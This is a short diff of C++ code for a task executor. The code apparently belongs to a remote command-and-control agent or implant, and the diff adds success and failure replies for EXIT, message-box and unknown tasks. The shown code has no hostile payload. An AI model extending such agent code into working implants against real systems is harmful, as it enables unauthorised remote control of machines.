@@ -132,13 +132,13 @@ void Executor::StartExecutor()
                 goto CLEANUP_TASK;
 
             // Execute the task
-
             try
             {
                 //// EXIT
                 if (IsTaskForExit(task))
                 {
                     this->pEventAgentShouldStop->Set();
+                    this->SetOutputInOutputQueue((PCHAR)taskId, strAgentCapResponseSuccess, FALSE);
                 }
 
                 //// MESSAGEBOX
@@ -146,6 +146,11 @@ void Executor::StartExecutor()
                 {
                     HandleTaskMessageBox(this->pWinApiCustom, task);
                     this->SetOutputInOutputQueue((PCHAR)taskId, strAgentCapResponseSuccess, FALSE);
+                }
+
+                //// FALLBACK
+                else {
+                    this->SetOutputInOutputQueue((PCHAR)taskId, strAgentCapResponseFailed, FALSE);
                 }
             }
             catch (...)
